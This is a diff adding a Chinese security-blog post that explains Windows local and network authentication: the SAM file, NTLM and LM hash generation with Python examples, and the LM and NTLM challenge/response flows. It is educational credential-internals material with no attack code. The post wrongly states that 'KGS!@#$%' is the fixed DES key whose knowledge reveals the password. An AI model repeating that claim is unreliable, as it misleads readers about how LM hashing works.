@@ -1,0 +1,1639 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="当一个女人结了婚,有了自己的孩子就……意味着,生活的起点,也意味着……终点. ——《廊桥遗梦》  首发tools 略长….">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows认证总结">
+<meta property="og:url" content="https://lengjibo.github.io/winlo/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="当一个女人结了婚,有了自己的孩子就……意味着,生活的起点,也意味着……终点. ——《廊桥遗梦》  首发tools 略长….">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70glcapgfj30ct0d83yh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70hclmxqcj30mi06y753.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70i0djnt8j30k50e5my5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70i83grvfj3142078wfr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70jp6qwxkj30qw08ktah.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70jpmf0grj30nv04575e.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70kxy0i6lj30yh0cegly.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7ezp69anwj30yt0klgm1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f0swocdfj30fo04kglg.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f0vhno3jj30i20bmglo.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f1dqltxyj313n0dsmxw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f20eaecyj30h50akdgm.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f21eh1w3j30h204s3z0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2iw88gzj30h50lognz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2ji8g5ij30hh0760us.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2jzqzioj30hp076jt7.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f2m7qqfvj30mq0jbwew.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7f9zvgmt4j315008yt9s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fa0bgp08j314i0d2410.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fa1kvkmlj30it0aujre.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fas0hhl7j30vy0nq412.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fblrt0iuj30kw051747.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fbeoilp1j30r504j3ye.jpg">
+<meta property="og:updated_time" content="2020-02-04T05:47:08.923Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows认证总结">
+<meta name="twitter:description" content="当一个女人结了婚,有了自己的孩子就……意味着,生活的起点,也意味着……终点. ——《廊桥遗梦》  首发tools 略长….">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g70glcapgfj30ct0d83yh.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/winlo/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>windows认证总结 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Accueil</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />A propos</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/winlo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows认证总结
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posté le</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-02-04 13:36:03 / Updated at: 13:47:08" itemprop="dateCreated datePublished" datetime="2020-02-04T13:36:03+08:00">2020-02-04</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Ｗeb安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>当一个女人结了婚,有了自己的孩子就……意味着,生活的起点,也意味着……终点.</p>
+<p>——《廊桥遗梦》</p>
+<hr>
+<p>首发tools</p>
+<p>略长….</p>
+<a id="more"></a>
+<h2 id="windows本地认证"><a href="#windows本地认证" class="headerlink" title="windows本地认证"></a>windows本地认证</h2><h3 id="本地认证基础知识"><a href="#本地认证基础知识" class="headerlink" title="本地认证基础知识"></a>本地认证基础知识</h3><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在</p>
+<blockquote>
+<p>%SystemRoot%\system32\config\sam</p>
+</blockquote>
+<p>当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!</p>
+<p>这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。</p>
+<p> <img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70glcapgfj30ct0d83yh.jpg" alt="截图_2019-09-15_20-08-02.png"></p>
+<p> <strong>Windows本身不保存明文密码，只保留密码的Hash。</strong></p>
+<h3 id="NTLM-Hash与NTLM"><a href="#NTLM-Hash与NTLM" class="headerlink" title="NTLM Hash与NTLM"></a>NTLM Hash与NTLM</h3><p>在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。</p>
+<p>这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p>
+<p>也就是说，NTLM与NTLM Hash相互对应。</p>
+<p>在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p>
+<h3 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h3><p>假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) = 61646d696e</span><br><span class="line">61646d696e -&gt; Unicode = 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure>
+<p>python下操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> passlib.hash <span class="keyword">import</span> nthash</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>h = nthash.hash(<span class="string">'admin'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>h</span><br><span class="line"><span class="string">'209c6174da490caeb422f3fa5a7ae634'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><blockquote>
+<p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p>
+</blockquote>
+<p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。</p>
+<ul>
+<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>
+<li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略</li>
+</ul>
+<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。</p>
+<p><strong>LM与NTLM协议的认证机制相同，但是加密算法不同。</strong></p>
+<p>目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p>
+<p>LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">将所有小写字母转换为大写字母</span><br><span class="line">• &gt;123ABC // 未达到7个字符</span><br><span class="line">• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补</span><br><span class="line">• &gt;31323341424300000000000000</span><br><span class="line">• 将密码分割为两组7个字节的块</span><br><span class="line">• &gt;31323341424300 00000000000000 // 16进制</span><br><span class="line">• 将每组转化为比特流，不足56Bit则在左边加0</span><br><span class="line">• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class="line">• 将比特流按照7比特一组，分出8组，末尾加0</span><br><span class="line"></span><br><span class="line">由于后者都为0，结果可想而知，那就都是0;</span><br><span class="line">• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。</span><br><span class="line">• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class="line">• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class="line">• 由于我们的密码不超过7字节，所以后面的一半是固定的:</span><br><span class="line">• AA-D3-B4-35-B5-14-04-EE</span><br><span class="line">• 连接两个DES加密字符串。这是LM哈希。</span><br><span class="line">• 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure>
+<p>python实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span><span class="params">(str, Des_Key)</span>:</span></span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="keyword">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(str)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Zero_padding</span><span class="params">(str)</span>:</span></span><br><span class="line">    b = []</span><br><span class="line">    l = len(str)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(str[n:n + <span class="number">7</span>] + <span class="string">'0'</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">"123456"</span></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写,并转换为16进制字符串</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">'hex'</span>)</span><br><span class="line">    str_len = len(test_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密码不足14字节将会用0来补全</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 固定长度的密码被分成两个7byte部分</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:len(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[len(test_str) / <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    t_1 = bin(int(t_1, <span class="number">16</span>)).lstrip(<span class="string">'0b'</span>).rjust(<span class="number">56</span>, <span class="string">'0'</span>)</span><br><span class="line">    t_2 = bin(int(t_2, <span class="number">16</span>)).lstrip(<span class="string">'0b'</span>).rjust(<span class="number">56</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再分7bit为一组末尾加0，组成新的编码</span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="keyword">print</span> t_1</span><br><span class="line">    t_1 = hex(int(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = hex(int(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'0'</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">"0000000000000000"</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上步骤得到的8byte二组，分别作为DES key为"KGS!@#$%"进行加密。</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">"KGS!@#$%"</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">"KGS!@#$%"</span>, t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="keyword">print</span> LM</span><br></pre></td></tr></table></figure>
+<p>在上面的产生过程中，脆弱点就在于DES的Key（KGS!@#$%）是固定的，也就是说，有了Key就能够解出原文。</p>
+<p>LM Hash问题：</p>
+<ul>
+<li>口令不区分大小写</li>
+<li>口令长度最大为14字节，另外如果口令长度不超过7字节，则LM Hash的后8字节是固定值</li>
+<li>DES算法强度不够</li>
+</ul>
+<p>根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。</p>
+<h2 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h2><p>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</p>
+<p>这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。</p>
+<p>早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。</p>
+<h3 id="LAN-Manager-Challenge-Response"><a href="#LAN-Manager-Challenge-Response" class="headerlink" title="LAN Manager Challenge/Response"></a>LAN Manager Challenge/Response</h3><p>LAN Manager Challenge/Response 验证机制，简称LM。该方案比NTLM响应时间更早，安全性更低。</p>
+<p><strong>SMB通信，Client A访问Server B通过LM身份验证的过程</strong></p>
+<ul>
+<li>首先我们假设Server B的密码为 “WELCOME” , Server B已经缓存了密码的LM-HASH （原始密码在任何情况下都不能被缓存）<br>我们通过上面的脚本计算”WELCOME”的LM-HASH为 “c23413a8a1e7665faad3b435b51404ee”</li>
+<li></li>
+<li>Server B – 8bytes Challenge –&gt; Client A<br>Server B向Client A发送了一个8字节挑战”0001020304050607”</li>
+<li></li>
+<li>Client A会根据自己的访问Server B的密码明文计算并缓存密码的LM-HASH（Client A缓存输入密码的哈希值，原始密码会被丢弃，“原始密码在任何情况下都不能被缓存”，这是一条基本的安全准则）<br>-然后在LM-HASH后5个0x00变成 “c23413a8a1e7665faad3b435b51404ee0000000000” ，变为21字节，然后划分成三组，每组7字节</li>
+</ul>
+<blockquote>
+<p>| C23413A8A1E766 | 5FAAD3B435B514 | 04EE0000000000 |</p>
+</blockquote>
+<p>每组7字节做为参数传递给str_to_key()函数，最终得到三组DESKEY，每组8字节</p>
+<blockquote>
+<p>| C21A04748A0E9CCC | 5ED4B47642ACD428 | 0476800000000000 |</p>
+</blockquote>
+<p>分别用三组DESKEY对8字节挑战 “0001020304050607” 进行标准DES加密后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C21A04748A0E9CCC ---- 对0001020304050607进行标准DES加密 --&gt; CA1200723C41D577</span><br><span class="line"></span><br><span class="line">5ED4B47642ACD428 ---- 对0001020304050607进行标准DES加密 --&gt; AB18C764C6DEF34F</span><br><span class="line"></span><br><span class="line">0476800000000000 ---- 对0001020304050607进行标准DES加密 --&gt; A61BFA0671EA5FC8</span><br></pre></td></tr></table></figure>
+<p>Client A最终获得一个24字节响应应”CA1200723C41D577AB18C764C6DEF34FA61BFA0671EA5FC8”（这个结果被称为response）</p>
+<p>Client A 将”CA1200723C41D577AB18C764C6DEF34FA61BFA0671EA5FC8” 送往Server B，Server B会根据自己缓存的LM-HASH进行同样的计算，并将计算结果与来自A的响应进行比较，如果匹配则身份验证通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C = 8-byte server challenge</span><br><span class="line">K1 | K2 | K3 = LM-Hash | 5-bytes-0</span><br><span class="line">response = DES(K1, C) | DES(K2, C) |  DES(K3, C)</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g70hclmxqcj30mi06y753.jpg" alt="1.png"></p>
+<h3 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h3><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。</p>
+<p><strong>这个协议只支持Windows</strong></p>
+<p><strong>Chalenge/Response</strong></p>
+<p>NTLM协议的认证过程分为三步：</p>
+<ol>
+<li>协商</li>
+<li>质询</li>
+<li>验证</li>
+</ol>
+<ul>
+<li><p><strong>协商：</strong> 主要用于确认双方协议版本(NTLM v1/NTLM V2)</p>
+</li>
+<li><p><strong>质询：</strong> 就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。</p>
+</li>
+<li><p><strong>验证：</strong> 验证主要是在质询完成后，验证结果，是认证的最后一步。</p>
+</li>
+</ul>
+<p><strong>质询的完整过程：</strong></p>
+<ol>
+<li>客户端向服务器端发送用户信息(用户名)请求</li>
+<li>服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li>
+<li>客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li>
+</ol>
+<p><strong>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。</strong></p>
+<p>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过</p>
+<p><strong>使用另外一种方式解读：</strong></p>
+<p>1.Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user</p>
+<p>如果没有，返回认证失败<br>如果有，生成Chanllenge，并且从本地查找share_user对 应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一 个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。<br>2.Client接收到Chanllenge后，将自己提供的share_user的密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge， 这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。</p>
+<p>3.Server接收到Client发送的Response，将Response与之 前的Net-NTLM Hash进行比较，如果相等，则认证通过。</p>
